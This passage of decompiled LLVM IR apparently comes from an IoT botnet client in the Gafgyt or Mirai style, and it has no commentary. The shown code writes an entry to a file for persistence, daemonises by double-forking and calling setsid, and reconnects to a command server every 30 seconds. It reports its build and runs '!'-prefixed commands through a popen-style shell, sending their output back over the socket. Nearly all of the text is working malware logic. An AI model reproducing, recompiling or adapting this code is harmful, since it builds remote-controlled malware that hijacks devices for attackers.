  store i32 ptrtoint ([19 x i8]* @global_var_22c0c.950 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_22c20.952 to i32), i32* @r1, align 4
  %v3_10cf8 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_22c0c.950 to i32), i32 ptrtoint ([2 x i8]* @global_var_22c20.952 to i32))
  %v2_10d08 = icmp eq i32 %v3_10cf8, 0
  br i1 %v2_10d08, label %dec_label_pc_10d10, label %dec_label_pc_10d2c

dec_label_pc_10d10:                               ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_22c24.954 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_22c20.952 to i32), i32* @r1, align 4
  %v3_10d20 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_22c24.954 to i32), i32 ptrtoint ([2 x i8]* @global_var_22c20.952 to i32))
  br label %dec_label_pc_10d2c

dec_label_pc_10d2c:                               ; preds = %entry, %dec_label_pc_10d10
  %stack_var_-88.0 = phi i32 [ %v3_10d20, %dec_label_pc_10d10 ], [ %v3_10cf8, %entry ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_22c24.954, i32 0, i32 0), %dec_label_pc_10d10 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_22c0c.950, i32 0, i32 0), %entry ]
  %v2_10d30 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v2_10d30, label %dec_label_pc_10ec8, label %dec_label_pc_10d38

dec_label_pc_10d38:                               ; preds = %dec_label_pc_10d2c
  %v2_10d48 = load i32, i32* %v1_10c2c, align 4
  %v1_10d4c = inttoptr i32 %v2_10d48 to i8*
  %v3_10d50 = call i32 @strlen(i8* %v1_10d4c)
  %v2_10d64 = ptrtoint i32* %stack_var_-368 to i32
  %v2_10d70 = call i32 @getcwd(i32 %v2_10d64, i32 256)
  store i32 ptrtoint (i32* @global_var_22c34.956 to i32), i32* @r1, align 4
  %v2_10d80 = bitcast i32* %stack_var_-368 to i8*
  %v3_10d80 = call i32 @__GI_strcoll(i8* %v2_10d80, i32 ptrtoint (i32* @global_var_22c34.956 to i32))
  %v2_10d88 = icmp eq i32 %v3_10d80, 0
  br i1 %v2_10d88, label %dec_label_pc_10ec0, label %dec_label_pc_10da0

dec_label_pc_10d94:                               ; preds = %dec_label_pc_10da0
  %v1_10d98 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_10da0

dec_label_pc_10da0:                               ; preds = %dec_label_pc_10d38, %dec_label_pc_10d94
  %stack_var_-84.0 = phi i32 [ %v1_10d98, %dec_label_pc_10d94 ], [ %v3_10d50, %dec_label_pc_10d38 ]
  %v2_10db0 = load i32, i32* %v1_10c2c, align 4
  %v2_10db8 = add i32 %v2_10db0, %stack_var_-84.0
  %v1_10dbc = inttoptr i32 %v2_10db8 to i8*
  %v2_10dbc = load i8, i8* %v1_10dbc, align 1
  %v7_10dc0 = icmp eq i8 %v2_10dbc, 47
  br i1 %v7_10dc0, label %dec_label_pc_10dc8, label %dec_label_pc_10d94

dec_label_pc_10dc8:                               ; preds = %dec_label_pc_10da0
  %v2_10dd8 = load i32, i32* %v1_10c2c, align 4
  %v2_10de0 = add i32 %v2_10dd8, %stack_var_-84.0
  %v2_10de4 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_10de4, i32* @r0, align 4
  %v7_10df8 = call i32 @sprintf(i32 %v2_10de4, i32 ptrtoint ([8 x i8]* @global_var_22c38.958 to i32), i32 %v2_10d64, i32 %v2_10de0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_10e54 = inttoptr i32 %stack_var_-88.0 to i8*
  %v2_10e08 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_10e34 = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_10e50.outer

dec_label_pc_10e00:                               ; preds = %dec_label_pc_10e50
  %v3_10e18 = call i32 @fgets(i32 %v2_10e08, i32 1024, i32 %stack_var_-88.0)
  %v3_10e34 = call i32 @__GI_strcasecmp(i8* %v2_10e34, i32 %v2_10de4)
  %v2_10e3c = icmp eq i32 %v3_10e34, 0
  br i1 %v2_10e3c, label %dec_label_pc_10e44, label %dec_label_pc_10e50

dec_label_pc_10e44:                               ; preds = %dec_label_pc_10e00
  %v1_10e48 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_10e50.outer

dec_label_pc_10e50.outer:                         ; preds = %dec_label_pc_10e44, %dec_label_pc_10dc8
  %stack_var_-80.0.ph = phi i32 [ %v1_10e48, %dec_label_pc_10e44 ], [ 0, %dec_label_pc_10dc8 ]
  br label %dec_label_pc_10e50

dec_label_pc_10e50:                               ; preds = %dec_label_pc_10e50.outer, %dec_label_pc_10e00
  %v2_10e54 = call i32 @feof(i8* %v1_10e54)
  %v2_10e5c = icmp eq i32 %v2_10e54, 0
  br i1 %v2_10e5c, label %dec_label_pc_10e00, label %dec_label_pc_10e64

dec_label_pc_10e64:                               ; preds = %dec_label_pc_10e50
  %v2_10e68 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v2_10e74 = call i32 @__GI_fclose(i8* %v1_10e54)
  br i1 %v2_10e68, label %dec_label_pc_10e70, label %dec_label_pc_10ec8

dec_label_pc_10e70:                               ; preds = %dec_label_pc_10e64
  %v4_10e78 = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_10e78, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_22c40.960 to i32), i32* @r1, align 4
  %v3_10e80 = call i32 @__GI_fopen(i32 %v4_10e78, i32 ptrtoint (i32* @global_var_22c40.960 to i32))
  %v2_10e90 = icmp eq i32 %v3_10e80, 0
  br i1 %v2_10e90, label %dec_label_pc_10ec8, label %dec_label_pc_10e98

dec_label_pc_10e98:                               ; preds = %dec_label_pc_10e70
  %v2_10ea4 = call i32 @__GI_fputs(i32 %v2_10de4, i32 %v3_10e80)
  %v1_10eac = inttoptr i32 %v3_10e80 to i8*
  %v2_10eac = call i32 @__GI_fclose(i8* %v1_10eac)
  br label %dec_label_pc_10ec8

dec_label_pc_10ec0:                               ; preds = %dec_label_pc_10d38
  %v1_10ec4 = inttoptr i32 %stack_var_-88.0 to i8*
  %v2_10ec4 = call i32 @__GI_fclose(i8* %v1_10ec4)
  br label %dec_label_pc_10ec8

dec_label_pc_10ec8:                               ; preds = %dec_label_pc_10e64, %dec_label_pc_10e70, %dec_label_pc_10d2c, %dec_label_pc_10e98, %dec_label_pc_10ec0
  %v0_10ec8 = call i32 @getOurIP()
  %v0_10ecc = call i32 @__libc_fork()
  %v2_10edc = icmp eq i32 %v0_10ecc, 0
  br i1 %v2_10edc, label %dec_label_pc_10f0c, label %dec_label_pc_10f48

dec_label_pc_10f0c:                               ; preds = %dec_label_pc_10ec8
  %v0_10f0c = call i32 @__libc_fork()
  %v2_10f1c = icmp eq i32 %v0_10f0c, 0
  br i1 %v2_10f1c, label %dec_label_pc_10f2c.thread, label %dec_label_pc_10f38

dec_label_pc_10f2c.thread:                        ; preds = %dec_label_pc_10f0c
  br label %dec_label_pc_10f54

dec_label_pc_10f38:                               ; preds = %dec_label_pc_10f0c
  %v1_10f28 = call i32 @__GI_exit(i32 0)
  %v2_10f40 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_22c44.962 to i32))
  br label %dec_label_pc_10f54

dec_label_pc_10f48:                               ; preds = %dec_label_pc_10ec8
  %v2_10ee4 = ptrtoint i32* %stack_var_-112 to i32
  %v3_10ef4 = call i32 @__libc_waitpid(i32 %v0_10ecc, i32 %v2_10ee4, i32 0)
  %v1_10efc = call i32 @__GI_exit(i32 0)
  %v2_10f50 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_22c44.962 to i32))
  br label %dec_label_pc_10f54

dec_label_pc_10f54:                               ; preds = %dec_label_pc_10f2c.thread, %dec_label_pc_10f38, %dec_label_pc_10f48
  %v0_10f54 = call i32 @__GI_setsid()
  %v0_10f5c = call i32 @chdir()
  %v2_10f68 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_1180c = ptrtoint i32* %stack_var_-5744 to i32
  %v4_1181c = bitcast i32* %stack_var_-5744 to i8*
  %v2_112b4 = add i32 %v19_10be4, -5720
  %v2_11574 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_11584 = bitcast i32* %stack_var_-1648 to i8*
  %v1_113f8 = or i32 %v2_1180c, 1
  %v5_113fc = inttoptr i32 %v1_113f8 to i8*
  %v2_11418 = or i32 %v2_1180c, 2
  %v2_116d8 = add i32 %v19_10be4, -600
  br label %dec_label_pc_10f70.outer

dec_label_pc_10f70.outer:                         ; preds = %dec_label_pc_11350, %dec_label_pc_117fc, %dec_label_pc_10f54
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_10f54 ], [ %stack_var_-96.2.ph, %dec_label_pc_117fc ], [ %v1_11354, %dec_label_pc_11350 ]
  %v0_10f7024 = call i32 @initConnection()
  %v2_10f7826 = icmp eq i32 %v0_10f7024, 0
  br i1 %v2_10f7826, label %dec_label_pc_10f8c, label %dec_label_pc_10f80

dec_label_pc_10f80:                               ; preds = %dec_label_pc_10f70.outer, %dec_label_pc_10f80
  %v1_10f84 = call i32 @sleep(i32 30)
  %v0_10f70 = call i32 @initConnection()
  %v2_10f78 = icmp eq i32 %v0_10f70, 0
  br i1 %v2_10f78, label %dec_label_pc_10f8c, label %dec_label_pc_10f80

dec_label_pc_10f8c:                               ; preds = %dec_label_pc_10f80, %dec_label_pc_10f70.outer
  %v2_10f90 = load i32, i32* @global_var_2c908.54, align 4
  store i32 %v2_10f90, i32* @r4, align 4
  %v0_10f94 = call i32 @getBuild()
  store i32 %v0_10f94, i32* @r5, align 4
  %v2_10fa0 = load i32, i32* @global_var_32b84.316, align 4
  store i32 %v2_10fa0, i32* @r0, align 4
  %v1_10fa4 = call i32 @__GI_inet_ntoa(i32 %v2_10fa0)
  %v0_10fac = load i32, i32* @r4, align 4
  %v0_10fb4 = load i32, i32* @r5, align 4
  store i32 %v0_10fb4, i32* @r2, align 4
  %v3_10fb8 = call i32 @sockprintf(i32 %v0_10fac, i32 ptrtoint ([16 x i8]* @global_var_22c54.966 to i32))
  br label %dec_label_pc_117fc.outer

dec_label_pc_10fdc:                               ; preds = %dec_label_pc_1128c, %dec_label_pc_11238
  %v3_10fe0 = mul i32 %v3_11280, 4
  %v2_10fec = load i32, i32* @global_var_32b90.75, align 4
  %v2_10ff0 = add i32 %v2_10fec, %v3_10fe0
  %v1_10ff4 = inttoptr i32 %v2_10ff0 to i32*
  %v2_10ff4 = load i32, i32* %v1_10ff4, align 4
  %v3_11004 = call i32 @__libc_waitpid(i32 %v2_10ff4, i32 0, i32 1)
  %tmp111 = icmp slt i32 %v3_11004, 1
  br i1 %tmp111, label %dec_label_pc_1122c, label %dec_label_pc_1106c

dec_label_pc_11024:                               ; preds = %dec_label_pc_110c8, %dec_label_pc_1106c
  %v3_11028 = mul i32 %v1_11018, 4
  %v2_11034 = load i32, i32* @global_var_32b90.75, align 4
  %v2_11038 = add i32 %v2_11034, %v3_11028
  %v1_1103c = add i32 %v2_11038, -4
  %v1_11058 = inttoptr i32 %v2_11038 to i32*
  %v2_11058 = load i32, i32* %v1_11058, align 4
  %v2_1105c = inttoptr i32 %v1_1103c to i32*
  store i32 %v2_11058, i32* %v2_1105c, align 4
  br label %dec_label_pc_1106c

dec_label_pc_1106c:                               ; preds = %dec_label_pc_10fdc, %dec_label_pc_11024
  %v3_11014.sink = phi i32 [ %v1_11018, %dec_label_pc_11024 ], [ %v3_11280, %dec_label_pc_10fdc ]
  %v1_11018 = add i32 %v3_11014.sink, 1
  %v2_11088 = load i32, i32* @global_var_2c910.72, align 4
  %v5_11088 = load i32, i32* @global_var_2c914.73, align 4
  %tmp112 = icmp ugt i32 %v5_11088, %v1_11018
  br i1 %tmp112, label %dec_label_pc_11024, label %dec_label_pc_110b0

dec_label_pc_110b0:                               ; preds = %dec_label_pc_1106c
  %v9_110c0 = icmp eq i32 %v5_11088, %v1_11018
  br i1 %v9_110c0, label %dec_label_pc_110c8, label %dec_label_pc_110e0

dec_label_pc_110c8:                               ; preds = %dec_label_pc_110b0
  %v9_110d8 = icmp eq i32 %v2_11088, 0
  br i1 %v9_110d8, label %dec_label_pc_110e0, label %dec_label_pc_11024

dec_label_pc_110e0:                               ; preds = %dec_label_pc_110c8, %dec_label_pc_110b0
  %v3_110e4 = mul i32 %v1_11018, 4
  %v2_110f0 = load i32, i32* @global_var_32b90.75, align 4
  %v2_110f4 = add i32 %v3_110e4, -4
  %v1_110f8 = add i32 %v2_110f4, %v2_110f0
  %v2_11100 = inttoptr i32 %v1_110f8 to i32*
  store i32 0, i32* %v2_11100, align 4
  %v2_11108 = load i32, i32* @global_var_2c910.72, align 4
  %v5_11108 = load i32, i32* @global_var_2c914.73, align 4
  %v2_11114 = add i32 %v2_11108, -1
  %v3_11114 = icmp ne i32 %v2_11108, 0
  %v3_11118 = add i32 %v5_11108, -1
  %v4_11118 = zext i1 %v3_11114 to i32
  %v5_11118 = add i32 %v3_11118, %v4_11118
  store i32 %v2_11114, i32* @global_var_2c910.72, align 4
  store i32 %v5_11118, i32* @global_var_2c914.73, align 4
  %v3_1112c = udiv i32 %v2_11114, 1073741824
  %v3_11130 = mul i32 %v5_11118, 4
  %v2_11134 = or i32 %v3_11130, %v3_1112c
  store i32 %v2_11134, i32* @r4, align 4
  %v3_11138 = mul i32 %v2_11114, 4
  %v1_1113c = add i32 %v3_11138, 4
  %v1_11144 = call i32 @malloc(i32 %v1_1113c)
  br label %dec_label_pc_1119c

dec_label_pc_1115c:                               ; preds = %dec_label_pc_111f8, %dec_label_pc_1119c
  %v3_11160 = mul i32 %v3_111ec, 4
  %v2_1116c = add i32 %v3_11160, %v1_11144
  %v2_11180 = load i32, i32* @global_var_32b90.75, align 4
  %v2_11184 = add i32 %v2_11180, %v3_11160
  %v1_11188 = inttoptr i32 %v2_11184 to i32*
  %v2_11188 = load i32, i32* %v1_11188, align 4
  %v2_1118c = inttoptr i32 %v2_1116c to i32*
  store i32 %v2_11188, i32* %v2_1118c, align 4
  %v1_11194 = add i32 %v3_111ec, 1
  br label %dec_label_pc_1119c

dec_label_pc_1119c:                               ; preds = %dec_label_pc_110e0, %dec_label_pc_1115c
  %v3_111ec = phi i32 [ 0, %dec_label_pc_110e0 ], [ %v1_11194, %dec_label_pc_1115c ]
  %v2_111b8 = load i32, i32* @global_var_2c910.72, align 4
  %v5_111b8 = load i32, i32* @global_var_2c914.73, align 4
  %tmp113 = icmp ugt i32 %v5_111b8, %v3_111ec
  br i1 %tmp113, label %dec_label_pc_1115c, label %dec_label_pc_111e0

dec_label_pc_111e0:                               ; preds = %dec_label_pc_1119c
  %v9_111f0 = icmp eq i32 %v5_111b8, %v3_111ec
  br i1 %v9_111f0, label %dec_label_pc_111f8, label %dec_label_pc_11210

dec_label_pc_111f8:                               ; preds = %dec_label_pc_111e0
  %v9_11208 = icmp eq i32 %v2_111b8, 0
  br i1 %v9_11208, label %dec_label_pc_11210, label %dec_label_pc_1115c

dec_label_pc_11210:                               ; preds = %dec_label_pc_111f8, %dec_label_pc_111e0
  %v2_11214 = load i32, i32* @global_var_32b90.75, align 4
  store i32 %v2_11214, i32* @r0, align 4
  %v0_1121c = call i32 @free()
  store i32 %v1_11144, i32* @global_var_32b90.75, align 4
  br label %dec_label_pc_1122c

dec_label_pc_1122c:                               ; preds = %dec_label_pc_10fdc, %dec_label_pc_11210
  %v1_11230 = add i32 %v3_11280, 1
  br label %dec_label_pc_11238

dec_label_pc_11238:                               ; preds = %dec_label_pc_117fc, %dec_label_pc_1122c
  %v3_11280 = phi i32 [ %v1_11230, %dec_label_pc_1122c ], [ 0, %dec_label_pc_117fc ]
  %v3_11240 = ashr i32 %v3_11280, 31
  %v2_11250 = load i32, i32* @global_var_2c910.72, align 4
  %v5_11250 = load i32, i32* @global_var_2c914.73, align 4
  %v3_1126c = icmp uge i32 %v5_11250, %v3_11280
  %v9_1126c = icmp eq i32 %v5_11250, %v3_11280
  %v2_11270 = xor i1 %v9_1126c, true
  %v3_11270 = and i1 %v3_1126c, %v2_11270
  br i1 %v3_11270, label %dec_label_pc_10fdc, label %dec_label_pc_11274

dec_label_pc_11274:                               ; preds = %dec_label_pc_11238
  br i1 %v9_1126c, label %dec_label_pc_1128c, label %dec_label_pc_112a4

dec_label_pc_1128c:                               ; preds = %dec_label_pc_11274
  %tmp = icmp ugt i32 %v2_11250, %v3_11240
  br i1 %tmp, label %dec_label_pc_10fdc, label %dec_label_pc_112a4

dec_label_pc_112a4:                               ; preds = %dec_label_pc_11274, %dec_label_pc_1128c
  %v2_112b8 = add i32 %v2_112b4, %v5_1181c
  %v3_112c0 = inttoptr i32 %v2_112b8 to i8*
  store i8 0, i8* %v3_112c0, align 1
  %v2_112d4 = call i32 @trim(i8* %v4_1181c)
  %v4_112ec = call i32 @strstr(i32 %v2_1180c, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1a708.56, i32 0, i32 0))
  store i32 %v4_112ec, i32* @r2, align 4
  %v9_11300 = icmp eq i32 %v4_112ec, %v2_1180c
  br i1 %v9_11300, label %dec_label_pc_11308, label %dec_label_pc_11320

dec_label_pc_11308:                               ; preds = %dec_label_pc_112a4
  %v2_1130c = load i32, i32* @global_var_2c908.54, align 4
  %v3_11318 = call i32 @sockprintf(i32 %v2_1130c, i32 ptrtoint ([5 x i8]* @global_var_22c64.971 to i32))
  br label %dec_label_pc_117fc

dec_label_pc_11320:                               ; preds = %dec_label_pc_112a4
  %v6_11334 = call i32 @strstr(i32 %v2_1180c, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_22c6c.973, i32 0, i32 0))
  %v9_11348 = icmp eq i32 %v6_11334, %v2_1180c
  br i1 %v9_11348, label %dec_label_pc_11350, label %dec_label_pc_1137c

dec_label_pc_11350:                               ; preds = %dec_label_pc_11320
  %v1_11354 = add i32 %stack_var_-96.2.ph, 1
  %v2_11364 = call i32 @zprintf(i32 ptrtoint ([20 x i8]* @global_var_22c70.975 to i32))
  %v7_11370 = icmp slt i32 %v1_11354, 21
  br i1 %v7_11370, label %dec_label_pc_10f70.outer, label %dec_label_pc_11374

dec_label_pc_11374:                               ; preds = %dec_label_pc_11350
  %v1_11378 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_1137c

dec_label_pc_1137c:                               ; preds = %dec_label_pc_11320, %dec_label_pc_11374
  %stack_var_-96.1 = phi i32 [ %v1_11354, %dec_label_pc_11374 ], [ %stack_var_-96.2.ph, %dec_label_pc_11320 ]
  %v2_11390 = load i8, i8* %v4_1181c, align 4
  %v7_11394 = icmp eq i8 %v2_11390, 33
  br i1 %v7_11394, label %dec_label_pc_113b8, label %dec_label_pc_117fc.outer

dec_label_pc_113b8:                               ; preds = %dec_label_pc_1137c, %dec_label_pc_113c8
  %v3_1139c.sink = phi i8* [ %storemerge8, %dec_label_pc_113c8 ], [ %v4_1181c, %dec_label_pc_1137c ]
  %v4_1139c = ptrtoint i8* %v3_1139c.sink to i32
  %v1_113a0 = add i32 %v4_1139c, 1
  %storemerge8 = inttoptr i32 %v1_113a0 to i8*
  %v2_113bc = load i8, i8* %storemerge8, align 1
  %v7_113c0 = icmp eq i8 %v2_113bc, 32
  br i1 %v7_113c0, label %dec_label_pc_113d8, label %dec_label_pc_113c8

dec_label_pc_113c8:                               ; preds = %dec_label_pc_113b8
  %v2_113cc = load i8, i8* %storemerge8, align 1
  %v2_113d0 = icmp eq i8 %v2_113cc, 0
  br i1 %v2_113d0, label %dec_label_pc_113d8, label %dec_label_pc_113b8

dec_label_pc_113d8:                               ; preds = %dec_label_pc_113c8, %dec_label_pc_113b8
  %v2_113dc = load i8, i8* %storemerge8, align 1
  %v2_113e0 = icmp eq i8 %v2_113dc, 0
  br i1 %v2_113e0, label %dec_label_pc_117fc.outer, label %dec_label_pc_113e8

dec_label_pc_113e8:                               ; preds = %dec_label_pc_113d8
  store i8 0, i8* %storemerge8, align 1
  %v3_11408 = call i32 @strlen(i8* %v5_113fc)
  %v1_1141c = add i32 %v3_11408, %v2_11418
  %v5_11420 = inttoptr i32 %v1_1141c to i8*
  %v2_11468 = add i32 %v1_1141c, -1
  br label %dec_label_pc_11450

dec_label_pc_11428:                               ; preds = %dec_label_pc_1147c, %dec_label_pc_11450
  %v3_11430 = call i32 @strlen(i8* %v5_11420)
  %v1_11444 = add i32 %v2_11468, %v3_11430
  %v3_1144c = inttoptr i32 %v1_11444 to i8*
  store i8 0, i8* %v3_1144c, align 1
  br label %dec_label_pc_11450

dec_label_pc_11450:                               ; preds = %dec_label_pc_113e8, %dec_label_pc_11428
  %v3_11458 = call i32 @strlen(i8* %v5_11420)
  %v1_1146c = add i32 %v3_11458, %v2_11468
  %v1_11470 = inttoptr i32 %v1_1146c to i8*
  %v2_11470 = load i8, i8* %v1_11470, align 1
  %v7_11474 = icmp eq i8 %v2_11470, 10
  br i1 %v7_11474, label %dec_label_pc_11428, label %dec_label_pc_1147c

dec_label_pc_1147c:                               ; preds = %dec_label_pc_11450
  %v3_11484 = call i32 @strlen(i8* %v5_11420)
  %v1_11498 = add i32 %v3_11484, %v2_11468
  %v1_1149c = inttoptr i32 %v1_11498 to i8*
  %v2_1149c = load i8, i8* %v1_1149c, align 1
  %v7_114a0 = icmp eq i8 %v2_1149c, 13
  br i1 %v7_114a0, label %dec_label_pc_11428, label %dec_label_pc_114a8

dec_label_pc_114a8:                               ; preds = %dec_label_pc_1147c
  %v2_114c428 = load i8, i8* %v5_11420, align 1
  %v7_114c832 = icmp eq i8 %v2_114c428, 32
  br i1 %v7_114c832, label %dec_label_pc_114e0, label %dec_label_pc_114d0

dec_label_pc_114b4:                               ; preds = %dec_label_pc_114d0
  %v1_114b8 = add i32 %v4_114c034, 1
  %v5_114bc = inttoptr i32 %v1_114b8 to i8*
  %v2_114c4 = load i8, i8* %v5_114bc, align 1
  %v7_114c8 = icmp eq i8 %v2_114c4, 32
  br i1 %v7_114c8, label %dec_label_pc_114e0, label %dec_label_pc_114d0

dec_label_pc_114d0:                               ; preds = %dec_label_pc_114a8, %dec_label_pc_114b4
  %v4_114c034 = phi i32 [ %v1_114b8, %dec_label_pc_114b4 ], [ %v1_1141c, %dec_label_pc_114a8 ]
  %stack_var_-64.033 = phi i8* [ %v5_114bc, %dec_label_pc_114b4 ], [ %v5_11420, %dec_label_pc_114a8 ]
  %v2_114d4 = load i8, i8* %stack_var_-64.033, align 1
  %v2_114d8 = icmp eq i8 %v2_114d4, 0
  br i1 %v2_114d8, label %dec_label_pc_114e0, label %dec_label_pc_114b4

dec_label_pc_114e0:                               ; preds = %dec_label_pc_114b4, %dec_label_pc_114d0, %dec_label_pc_114a8
  %stack_var_-64.0.lcssa = phi i8* [ %v5_11420, %dec_label_pc_114a8 ], [ %v5_114bc, %dec_label_pc_114b4 ], [ %stack_var_-64.033, %dec_label_pc_114d0 ]
  %v4_114c0.lcssa = phi i32 [ %v1_1141c, %dec_label_pc_114a8 ], [ %v1_114b8, %dec_label_pc_114b4 ], [ %v4_114c034, %dec_label_pc_114d0 ]
  store i8 0, i8* %stack_var_-64.0.lcssa, align 1
  %v1_114f0 = add i32 %v4_114c0.lcssa, 1
  %v2_1153439 = load i8, i8* %v5_11420, align 1
  %v2_1153841 = icmp eq i8 %v2_1153439, 0
  br i1 %v2_1153841, label %dec_label_pc_11540, label %dec_label_pc_11504

dec_label_pc_11504:                               ; preds = %dec_label_pc_114e0, %dec_label_pc_11504
  %storemerge743 = phi i8* [ %storemerge7, %dec_label_pc_11504 ], [ %v5_11420, %dec_label_pc_114e0 ]
  %storemerge1442 = phi i32 [ %v1_11528, %dec_label_pc_11504 ], [ %v1_1141c, %dec_label_pc_114e0 ]
  %v2_11508 = load i8, i8* %storemerge743, align 1
  %v3_11508 = zext i8 %v2_11508 to i32
  %v1_11510 = call i32 @__GI_toupper(i32 %v3_11508)
  %v1_11520 = trunc i32 %v1_11510 to i8
  store i8 %v1_11520, i8* %storemerge743, align 1
  %v1_11528 = add i32 %storemerge1442, 1
  %storemerge7 = inttoptr i32 %v1_11528 to i8*
  %v2_11534 = load i8, i8* %storemerge7, align 1
  %v2_11538 = icmp eq i8 %v2_11534, 0
  br i1 %v2_11538, label %dec_label_pc_11540, label %dec_label_pc_11504

dec_label_pc_11540:                               ; preds = %dec_label_pc_11504, %dec_label_pc_114e0
  store i32 ptrtoint ([3 x i8]* @global_var_22c84.977 to i32), i32* @r1, align 4
  %v4_1154c = call i32 @__GI_strcoll(i8* %v5_11420, i32 ptrtoint ([3 x i8]* @global_var_22c84.977 to i32))
  %v2_11554 = icmp eq i32 %v4_1154c, 0
  br i1 %v2_11554, label %dec_label_pc_1155c, label %dec_label_pc_11664

dec_label_pc_1155c:                               ; preds = %dec_label_pc_11540
  %v0_1155c = call i32 @listFork()
  %v2_11564 = icmp eq i32 %v0_1155c, 0
  br i1 %v2_11564, label %dec_label_pc_1156c, label %dec_label_pc_117fc.outer

dec_label_pc_1156c:                               ; preds = %dec_label_pc_1155c
  store i32 1024, i32* @r2, align 4
  %v3_11584 = call i32 @__GI_memset(i8* %v2_11584, i32 0)
  %v6_115a4 = call i32 @szprintf(i32 %v2_11574, i32 ptrtoint ([8 x i8]* @global_var_22c88.979 to i32), i32 %v1_114f0, i32 %v2_11574, i32 ptrtoint (i32* @0 to i32))
  %v3_115c0 = call i32 @fdpopen(i32 %v2_11574, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22c20.952, i32 0, i32 0))
  br label %dec_label_pc_1162c

dec_label_pc_115d0:                               ; preds = %dec_label_pc_1162c
  %v2_115e0 = call i32 @trim(i8* %v2_11584)
  %v2_115e8 = load i32, i32* @global_var_2c908.54, align 4
  store i32 %v2_11574, i32* @r2, align 4
  %v3_11604 = call i32 @sockprintf(i32 %v2_115e8, i32 ptrtoint ([3 x i8]* @global_var_22c90.981 to i32))
  store i32 1024, i32* @r2, align 4
  %v3_11620 = call i32 @__GI_memset(i8* %v2_11584, i32 0)
  %v1_11628 = call i32 @sleep(i32 1)
  br label %dec_label_pc_1162c

dec_label_pc_1162c:                               ; preds = %dec_label_pc_1156c, %dec_label_pc_115d0
  %v4_11644 = call i32 @fdgets(i32 %v2_11574, i32 1024, i32 %v3_115c0, i32 %v2_11574)
  %v2_1164c = icmp eq i32 %v4_11644, 0
  br i1 %v2_1164c, label %dec_label_pc_11654, label %dec_label_pc_115d0

dec_label_pc_11654:                               ; preds = %dec_label_pc_1162c
  %v1_11658 = call i32 @fdpclose(i32 %v3_115c0)
  %v1_11660 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_11664

dec_label_pc_11664:                               ; preds = %dec_label_pc_11540, %dec_label_pc_11654
  store i32 %v1_114f0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_22c94.983 to i32), i32* @r1, align 4
  %v2_11678 = call i32 @__GI_strtok(i32 %v1_114f0, i32 ptrtoint (i32* @global_var_22c94.983 to i32))
  store i32 %v1_1141c, i32* %stack_var_-624, align 4
  %v2_1178046 = icmp eq i32 %v2_11678, 0
  br i1 %v2_1178046, label %dec_label_pc_11788, label %dec_label_pc_11690

dec_label_pc_11690:                               ; preds = %dec_label_pc_11664, %dec_label_pc_11768
  %stack_var_-36.049.in = phi i32 [ %v2_11770, %dec_label_pc_11768 ], [ %v2_11678, %dec_label_pc_11664 ]
  %stack_var_-40.147 = phi i32 [ %stack_var_-40.0, %dec_label_pc_11768 ], [ 1, %dec_label_pc_11664 ]
  %stack_var_-36.049 = inttoptr i32 %stack_var_-36.049.in to i8*
  %v2_11694 = load i8, i8* %stack_var_-36.049, align 1
  %v7_11698 = icmp eq i8 %v2_11694, 10
  br i1 %v7_11698, label %dec_label_pc_11768, label %dec_label_pc_116a0

dec_label_pc_116a0:                               ; preds = %dec_label_pc_11690
  store i32 %stack_var_-40.147, i32* @r4, align 4
  %v3_116ac = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_116b4 = add i32 %v3_116ac, 1
  %v1_116bc = call i32 @malloc(i32 %v1_116b4)
  %v0_116d0 = load i32, i32* @r4, align 4
  %v3_116d0 = mul i32 %v0_116d0, 4
  %v2_116dc = add i32 %v2_116d8, %v3_116d0
  %v2_116e0 = inttoptr i32 %v2_116dc to i32*
  store i32 %v1_116bc, i32* %v2_116e0, align 4
  %v3_116f0 = mul i32 %stack_var_-40.147, 4
  %v2_116f8 = add i32 %v3_116f0, %v19_10be4
  %v2_116fc = add i32 %v2_116f8, -600
  %v1_11700 = inttoptr i32 %v2_116fc to i32*
  %v2_11700 = load i32, i32* %v1_11700, align 4
  store i32 %v2_11700, i32* @r4, align 4
  %v3_1170c = call i32 @strlen(i8* nonnull %stack_var_-36.049)
  %v1_11714 = add i32 %v3_1170c, 1
  %v0_11718 = load i32, i32* @r4, align 4
  store i32 %v1_11714, i32* @r2, align 4
  %v2_11728 = inttoptr i32 %v0_11718 to i8*
  %v3_11728 = call i32 @__GI_memset(i8* %v2_11728, i32 0)
  %v2_11748 = load i32, i32* %v1_11700, align 4
  %v4_11758 = call i32 @strcpy(i32 %v2_11748, i8* nonnull %stack_var_-36.049)
  %v1_11760 = add i32 %stack_var_-40.147, 1
  br label %dec_label_pc_11768

dec_label_pc_11768:                               ; preds = %dec_label_pc_11690, %dec_label_pc_116a0
  %stack_var_-40.0 = phi i32 [ %stack_var_-40.147, %dec_label_pc_11690 ], [ %v1_11760, %dec_label_pc_116a0 ]
  store i32 0, i32* @r0, align 4
